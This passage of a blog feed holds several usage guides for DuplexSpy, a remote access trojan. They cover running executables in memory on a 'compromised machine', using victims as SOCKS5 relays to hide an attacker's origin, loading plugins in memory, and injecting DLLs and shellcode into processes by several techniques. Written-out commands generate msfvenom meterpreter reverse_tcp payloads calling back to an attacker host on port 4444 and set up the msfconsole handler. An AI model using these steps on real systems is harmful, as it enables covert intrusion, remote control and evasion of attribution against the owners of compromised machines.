    <updated>2026-02-22T17:23:04.720Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the <strong>Fileless Execution</strong> feature of DuplexSpy.</p><p>This feature allows you to execute a PE (Portable Executable) file on a compromised machine without writing it to disk.</p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The C2 server sends raw PE file bytes to the compromised machine. The DuplexSpy payload loads these PE bytes into memory and executes them. When the payload receives a fileless execution command, it creates a new process to execute the PE entirely from memory.</p><p>The figure below illustrates the execution flow:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/procedure.svg'><img src="/images/article/tools/duplexspy/fileless/procedure.svg" width="1000"></p><p>The x64 version of PE loader is based on the implementation by <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs">Casey Smith</a>. However, I have developed the <a href="https://github.com/iss4cf0ng/dotNetPELoader">x86 version</a> in case the C# payload uses the x86 platform.</p><p>Note that a loader can only execute PE files that match its architecture. An x64 loader cannot execute x86 PE files and vice versa. Make sure you identify the architecture of the target PE and select the matched loader.</p><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="300"></p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Example-1-x64-msfvenom"><a href="#Example-1-x64-msfvenom" class="headerlink" title="Example 1 - x64 msfvenom"></a>Example 1 - x64 msfvenom</h2><p>First, check the architecture of the executed payload:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.1.png'><img src="/images/article/tools/duplexspy/fileless/check.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.2.png'><img src="/images/article/tools/duplexspy/fileless/check.2.png" width="700"></p><p>Generate an x64 Messagebox payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/x64/messagebox TEXT=&quot;msf hello world&quot; -f exe &gt; x64.exe<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.1.png'><img src="/images/article/tools/duplexspy/fileless/msf.1.png" width="700"></p><p>The <code>x64.exe</code> is executed successfully without being written to disk. This is fileless execution. Next, check the process list:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tasklist | find &quot;client.exe&quot;<br></code></pre></td></tr></table></figure><p>Here <code>client.exe</code> is your DuplexSpy payload.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.2.png'><img src="/images/article/tools/duplexspy/fileless/msf.2.png" width="700"></p><p>Two instance of <code>client.exe</code> (the DuplexSpy payload) are running. One instance maintains communication with the C2 server, while the other is for executing the filesless payload.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.3.png'><img src="/images/article/tools/duplexspy/fileless/msf.3.png" width="700"></p><h2 id="Example-2-x86-meterpreter"><a href="#Example-2-x86-meterpreter" class="headerlink" title="Example 2 - x86 meterpreter"></a>Example 2 - x86 meterpreter</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 lhost=192.168.1.192 lport=4444 -f exe -a x86 &gt; x86.exe<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.4.png'><img src="/images/article/tools/duplexspy/fileless/msf.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.5.png'><img src="/images/article/tools/duplexspy/fileless/msf.5.png" width="700"></p><h2 id="Example-3-x86-calc-exe"><a href="#Example-3-x86-calc-exe" class="headerlink" title="Example 3 - x86 calc.exe"></a>Example 3 - x86 calc.exe</h2><p>Now, try executing a more complex application:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/calc.1.png'><img src="/images/article/tools/duplexspy/fileless/calc.1.png" width="500"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
      
    
    
    
    <category term="Tools/DuplexSpy" scheme="https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"/>
    
    
    <category term="DuplexSpy" scheme="https://iss4cf0ng.github.io/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
    <category term="Documentation" scheme="https://iss4cf0ng.github.io/tags/Documentation/"/>
    
    <category term="Tools" scheme="https://iss4cf0ng.github.io/tags/Tools/"/>
    
    <category term="Fileless Execution" scheme="https://iss4cf0ng.github.io/tags/Fileless-Execution/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] SOCKS5 Proxy</title>
    <link href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyProxy/"/>
    <id>https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyProxy/</id>
    <published>2026-02-03T12:19:31.000Z</published>
    <updated>2026-02-22T17:23:30.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the proxy feature of DuplexSpy.</p><p>This feature allows you to use a compromised machine as a proxy, meaning that all network traffic from your machine can be forwarded through the compromised host. </p><p>Even if a compromised machine does not store sensitive data, it can still be abused as a proxy or relay node for malicious activities, such as forwarding <strong>SSH</strong> sessions. This allows threat actors to hide their real origin and reduce the risk of attribution.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/1.png'><img src="/images/article/tools/duplexspy/proxy/1.png" width="1000"></p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>A C2 server starts listening on one or more ports and accepts SOCKS5 connections from proxy users. The C2 server redirects the user’s network stream to a compromised machine, which then forwards the traffic to the target host. All DNS resolution is performed on the compromised machine.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/10.png'><img src="/images/article/tools/duplexspy/proxy/10.png" width="1000"></p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>In this example, I demonstrates the proxy feature through SSH and proxychains.  The following table describes the experimental environment:</p><div class="table-container"><table><thead><tr><th>Host</th><th>OS</th><th>Description</th></tr></thead><tbody><tr><td>10.98.225.138</td><td>Ubuntu VM</td><td>Target host. It has enabled SSH service. An important file is stored at <code>~/Desktop/foo.txt</code>.</td></tr><tr><td>10.98.222.136</td><td>Windows 10 x64</td><td>Compromised machine.</td></tr><tr><td>10.98.241.11</td><td>Debian Kali Linux</td><td>Attacker machine.</td></tr><tr><td>10.98.253.150</td><td>Windows 10</td><td>Attacker’s C2 server.</td></tr></tbody></table></div><p>Start the DuplexSpy C2 server:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/2.png'><img src="/images/article/tools/duplexspy/proxy/2.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/3.png'><img src="/images/article/tools/duplexspy/proxy/3.png" width="700">    <figcaption>    Right click the compromised host and select <b>Proxy</b>    </figcaption></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/4.png'><img src="/images/article/tools/duplexspy/proxy/4.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/5.png'><img src="/images/article/tools/duplexspy/proxy/5.png" width="400">    <figcaption>    You should use an unused port.    </figcaption></p><p>Next, establish an SSH connection from Kali Linux to the target host <code>10.98.225.138</code>.</p><p>Configure the proxychains:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ vim /etc/proxychains.conf<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/6.png'><img src="/images/article/tools/duplexspy/proxy/6.png" width="500"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ proxychains ssh sdksdk@10.98.225.138<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/7.png'><img src="/images/article/tools/duplexspy/proxy/7.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/8.png'><img src="/images/article/tools/duplexspy/proxy/8.png" width="700"></p><p>Now, check the source IP address on the target host:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">netstat -ano | grep &quot;:22&quot;<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/9.png'><img src="/images/article/tools/duplexspy/proxy/9.png" width="800"></p><p>The source address is <code>10.98.222.136:54372</code>, which belongs to the compromised machine.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
      
    
    
    
    <category term="Tools/DuplexSpy" scheme="https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"/>
    
    
    <category term="DuplexSpy" scheme="https://iss4cf0ng.github.io/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
    <category term="Documentation" scheme="https://iss4cf0ng.github.io/tags/Documentation/"/>
    
    <category term="Tools" scheme="https://iss4cf0ng.github.io/tags/Tools/"/>
    
    <category term="SOCKS5" scheme="https://iss4cf0ng.github.io/tags/SOCKS5/"/>
    
    <category term="Proxy" scheme="https://iss4cf0ng.github.io/tags/Proxy/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] Using and Developing a Plugin.</title>
    <link href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyPlugin/"/>
    <id>https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyPlugin/</id>
    <published>2026-02-03T12:18:50.000Z</published>
    <updated>2026-02-22T17:23:35.441Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>DuplexSpy provides a simple remote plugin manager that allows you to load customized plugins into a compromised machine without writing them to disk.</p><p>This article describes how to use and develop a custom plugin for DuplexSpy.</p><p>Note that all plugins are implemented using .NET Framework 4.8 for compatibility reasons.</p><p>The plugin manager interface provides a GUI ListView and a console.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/1.png'><img src="/images/article/tools/duplexspy/plugin/1.png" width="700"></p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The C2 server sends the raw DLL bytes of plugin assemblies to the compromised machine. The payload loads these assemblies into memory using the <code>Assembly.Load()</code> method and stores their interfaces in a read-only dictionary. The payload can invoke plugin interfaces and pass parameters whenever it receives commands from the C2 server.</p><p>When the payload is terminated, all loaded plugins are automatically released by the system.</p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>The plugin console provides the following commands:</p><table>  <thead>    <tr>      <th>Command</th>      <th>Description</th>    </tr>  </thead>  <tbody>    <tr>      <td><code>clear</code></td>      <td>Clear the console output.</td>    </tr>    <tr>      <td><code>show</code></td>      <td>List all available plugins under the plugin folder.</td>    </tr>    <tr>      <td><code>loaded</code></td>      <td>Show all currently loaded plugins.</td>    </tr>    <tr>      <td><code>load &lt;all | plugin name&gt;</code></td>      <td>Load specified plugin.</td>    </tr>    <tr>      <td><code>unload &lt;all | plugin name&gt;</code></td>      <td>Unload the specified plugin.</td>    </tr>    <tr>      <td><code>&lt;entry&gt; &lt;param1&gt; &lt;param2&gt; ...</code></td>      <td>Use specified plugin with parameters.</td>    </tr>  </tbody></table><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/2.png'><img src="/images/article/tools/duplexspy/plugin/2.png" width="700"></p><h2 id="Example-1-Coffee"><a href="#Example-1-Coffee" class="headerlink" title="Example 1 - Coffee"></a>Example 1 - Coffee</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">coffee help<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/coffee.1.png'><img src="/images/article/tools/duplexspy/plugin/coffee.1.png" width="700"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">coffee print=1<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/coffee.2.png'><img src="/images/article/tools/duplexspy/plugin/coffee.2.png" width="700"></p><p>Note that the <strong>Plugin Manager</strong> throws an exception if an unhandled exception occurs inside a plugin and displays the corresponding error message. However, the payload itself will not be terminated.</p><h2 id="Example-2-Dumper"><a href="#Example-2-Dumper" class="headerlink" title="Example 2 - Dumper"></a>Example 2 - Dumper</h2><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dumper.1.png'><img src="/images/article/tools/duplexspy/plugin/dumper.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dumper.2.png'><img src="/images/article/tools/duplexspy/plugin/dumper.2.png" width="700"></p><h2 id="Example-3-InfoSpyder"><a href="#Example-3-InfoSpyder" class="headerlink" title="Example 3 - InfoSpyder"></a>Example 3 - InfoSpyder</h2><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/infospyder.1.png'><img src="/images/article/tools/duplexspy/plugin/infospyder.1.png" width="700"></p><h1 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h1><p>To develop a plugin. Firstly, create a new .NET framework 4.8 library project.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.1.png'><img src="/images/article/tools/duplexspy/plugin/dev.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.2.png'><img src="/images/article/tools/duplexspy/plugin/dev.2.png" width="600">    <figcaption>    Any name that you like. This name is regardless for the final result.    </figcaption></p><p>Add a reference <code>Plugin.Abstractions48</code>:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.3.png'><img src="/images/article/tools/duplexspy/plugin/dev.3.png" width="600">    <figcaption>    Right click your project -> Add -> Reference    </figcaption></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.4.png'><img src="/images/article/tools/duplexspy/plugin/dev.4.png" width="600">    <figcaption>    Plugin.Abstractions48    </figcaption></p><p>Don’t forget to use it in your project.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.5.png'><img src="/images/article/tools/duplexspy/plugin/dev.5.png" width="600"></p><p>Add the required attributes and properties. The <code>HelpTable</code> is optional but recommended. The <code>Name</code> field must be a unique identifier for the plugin.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.6.png'><img src="/images/article/tools/duplexspy/plugin/dev.6.png" width="600"></p><p>Add the required functions:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.7.png'><img src="/images/article/tools/duplexspy/plugin/dev.7.png" width="600"></p><p>At this point, you have successfully developed a custom plugin. Before building the project, install <code>Costura.Fody</code> to ensure that all dependencies are merged into a single DLL, even if no additional NuGet packages are used.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.8.png'><img src="/images/article/tools/duplexspy/plugin/dev.8.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.9.png'><img src="/images/article/tools/duplexspy/plugin/dev.9.png" width="600"></p><p>Build the DLL file:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.10.png'><img src="/images/article/tools/duplexspy/plugin/dev.10.png" width="600">    <figcaption>    Right click your project -> Build    </figcaption></p><p>Move the generated DLL into the <code>.\Plugins</code> folder of DuplexSpy and create a JSON file <strong>WITH THE SAME FILE NAME (important)</strong>.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.11.png'><img src="/images/article/tools/duplexspy/plugin/dev.11.png" width="600"></p><p>The JSON file should be structured as follows. The <code>Name</code> field must match the plugin name defined in the code. The <code>Entry</code> field specifies the command name used in the plugin console. The <code>Command</code> field is reserved for future use.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.12.png'><img src="/images/article/tools/duplexspy/plugin/dev.12.png" width="600"></p><p>Go to DuplexSpy. Open <strong>Plugin</strong>:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.13.png'><img src="/images/article/tools/duplexspy/plugin/dev.13.png" width="600"></p><p>Our <code>HelloWorld</code> plugin has been successfully installed. Now let’s try it in the console:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.14.png'><img src="/images/article/tools/duplexspy/plugin/dev.14.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/plugin/dev.15.png'><img src="/images/article/tools/duplexspy/plugin/dev.15.png" width="600"></p><p>Congratulations! You have successfully developed and deployed a custom Duplex plugin.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;DuplexSpy provides a simple re</summary>
      
    
    
    
    <category term="Tools/DuplexSpy" scheme="https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"/>
    
    
    <category term="C#" scheme="https://iss4cf0ng.github.io/tags/C/"/>
    
    <category term="DuplexSpy" scheme="https://iss4cf0ng.github.io/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
    <category term="Documentation" scheme="https://iss4cf0ng.github.io/tags/Documentation/"/>
    
    <category term="Remote Plugin" scheme="https://iss4cf0ng.github.io/tags/Remote-Plugin/"/>
    
    <category term=".NET" scheme="https://iss4cf0ng.github.io/tags/NET/"/>
    
  </entry>
  
  <entry>
    <title>[DuplexSpy] DLL and Shellcode Injection and Loader</title>
    <link href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/"/>
    <id>https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/</id>
    <published>2026-02-03T12:18:07.000Z</published>
    <updated>2026-02-22T17:22:52.110Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the DLL and shellcode injection features of DuplexSpy.</p><p>This feature allows you to inject a DLL or shellcode into a target process. DuplexSpy also provides a DLL loader and a shellcode loader, which allows you to execute payloads without injecting them into an existing process.</p><p>If you would like to learn more about DLL and shellcode injection techniques, you can refer to the notes I wrote for studying <a href="https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/#Chapter-21-Windows-Message-Hooking">reverse engineering</a> and <a href="https://iss4cf0ng.github.io/2026/01/02/2026-1-2-NoteWindowsBufferOverflow/">Windows buffer overflow</a>.</p><h1 id="Injector"><a href="#Injector" class="headerlink" title="Injector"></a>Injector</h1><p>This features allows you to inject a DLL file or shellcode in a specified process. However, due to Windows security protections, this method may not always work.</p><p>Note that the DLL file or shellcode must match the architecture of the target process (x86 or x64). An x86 process canoot load an x64 DLL or shellcode, and vice versa.</p><p>DuplexSpy provides the following injection methods for both DLL and shellcode:</p><ul><li><strong>APC</strong></li><li><strong>Early Bird</strong></li><li><strong>CreateRemoteThread (default)</strong></li><li><strong>NtCreateThreadEx</strong></li><li><strong>ZwCreateThreadEx</strong></li></ul><p>Before performing an injection, you should determine the architecture of the target process. An x86 DLL cannot be injected into an x64 process, and vice versa. On x64 systems, PE files uder <code>C:\Windows\System32</code> are typically x64 binaries, while PE files under <code>C:\Windows\SysWOW64</code> are x86 binaries.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/1.png'><img src="/images/article/tools/duplexspy/injector/1.png" width="400"></p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h2><p>Notice that this method <strong>IS NOT</strong> fileless. A DLL file will be created under <code>%TEMP%</code> directory and might be detected or deleted by antivirus software.</p><p>The <code>CreateRemoteThread</code> method is recommended for DLL injection.</p><p>In this example, Kali Linux is used to establish a <strong>Meterpreter</strong> reverse TCP connection via DLL injection.</p><div class="table-container"><table><thead><tr><th>Field</th><th>Value</th></tr></thead><tbody><tr><td>Target process</td><td><code>C:\Windows\SysWOW64\notepad.exe</code></td></tr><tr><td>Kali host</td><td>192.168.1.192</td></tr><tr><td>Kali port</td><td>4444</td></tr></tbody></table></div><p>Build an <strong>x86</strong> payload using <strong>msfvenom</strong>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.192 lport=4444 -a x86 -f dll &gt; x86.dll<br></code></pre></td></tr></table></figure></p><p><strong>Msfconsole:</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfconsole<br>msf&gt; use exploit/multi/handler<br>msf&gt; set payload windows/meterpreter/reverse_tcp<br>msf&gt; set lhost 192.168.1.192<br>msf&gt; set lport 4444<br>msf&gt; run<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/msf.1.png'><img src="/images/article/tools/duplexspy/injector/msf.1.png" width="600"></p><h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p>Let’s try the <strong>CreateRemoteThread</strong> method:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.1.png'><img src="/images/article/tools/duplexspy/injector/dll.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.2.png'><img src="/images/article/tools/duplexspy/injector/dll.2.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.3.png'><img src="/images/article/tools/duplexspy/injector/dll.3.png" width="600"></p><p>Notice that the log messages in the box are not always reliable. A DuplexSpy payload cannot check your msf payload!</p><p>Next, exit your meterpreter session:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">meterpreter&gt; exit<br></code></pre></td></tr></table></figure></p><p>Process <code>notepad.exe</code> is still running!</p><h3 id="NtCreateThreadEx"><a href="#NtCreateThreadEx" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h3><p><strong>NtCreateThreadEx</strong> method:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.4.png'><img src="/images/article/tools/duplexspy/injector/dll.4.png" width="600"></p><p>It works again ( . 3 .)</p><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="400"></p><h3 id="ZwCreateThreadEx"><a href="#ZwCreateThreadEx" class="headerlink" title="ZwCreateThreadEx"></a>ZwCreateThreadEx</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.5.png'><img src="/images/article/tools/duplexspy/injector/dll.5.png" width="600"></p><h2 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode Injection</h2><p>This method is fileless.</p><p>The <code>CreateRemoteThread</code> method is recommended for shellcode injection.</p><p>Use the following command to generate a meterpreter shellcode:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f c<br></code></pre></td></tr></table></figure></p><p>Paste the output into the shellcode editor of DuplexSpy.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.5.png'><img src="/images/article/tools/duplexspy/injector/sc.5.png" width="600"></p><p>Click the “Formatting” button at the top of the window form. You can also click the “Save” button, DuplexSpy automatically runs the “Formatting” function.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.6.png'><img src="/images/article/tools/duplexspy/injector/sc.6.png" width="600">    <figcaption>    Formatting    </figcapton></p><h3 id="CreateRemoteThread-1"><a href="#CreateRemoteThread-1" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.1.png'><img src="/images/article/tools/duplexspy/injector/sc.1.png" width="600"></p><h3 id="NtCreateThreadEx-1"><a href="#NtCreateThreadEx-1" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.2.png'><img src="/images/article/tools/duplexspy/injector/sc.2.png" width="600"></p><h3 id="ZwCreateThreadEx-1"><a href="#ZwCreateThreadEx-1" class="headerlink" title="ZwCreateThreadEx"></a>ZwCreateThreadEx</h3><p>Lastly, let’s try the <strong>ZwCreateThreadEx</strong> method. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.3.png'><img src="/images/article/tools/duplexspy/injector/sc.3.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.4.png'><img src="/images/article/tools/duplexspy/injector/sc.4.png" width="600"></p><h2 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h2><p>DuplexSpy allows you to load a DLL file or shellcode directly without injecting it into an existing process. As with injection, the payload architecture must match the loader architecture (x86 or x64).</p><p>For performance reasons, DuplexSpy creates a new process for both DLL and shellcode loading. This behavior is similar to the fileless execution features of DuplexSpy; however, the loader architecture cannot be selected manually. If the DuplexSpy payload is x64, only x64 DLLs or shellcodes can be loaded.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/1.svg'><img src="/images/article/tools/duplexspy/loader/1.svg" width="800"></p><h3 id="DLL-Loader"><a href="#DLL-Loader" class="headerlink" title="DLL Loader"></a>DLL Loader</h3><p>Note that this method is not fileless. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/dll.1.png'><img src="/images/article/tools/duplexspy/loader/dll.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/dll.2.png'><img src="/images/article/tools/duplexspy/loader/dll.2.png" width="600"></p><h3 id="Shellcode-Loader"><a href="#Shellcode-Loader" class="headerlink" title="Shellcode Loader"></a>Shellcode Loader</h3><p>DuplexSpy allows you to load shellcode into memory. It is a fileless method.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.1.png'><img src="/images/article/tools/duplexspy/loader/shellcode.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.2.png'><img src="/images/article/tools/duplexspy/loader/shellcode.2.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.3.png'><img src="/images/article/tools/duplexspy/loader/shellcode.3.png" width="600"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
      
    
    
    
    <category term="Tools/DuplexSpy" scheme="https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"/>
    
    
    <category term="DuplexSpy" scheme="https://iss4cf0ng.github.io/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
    
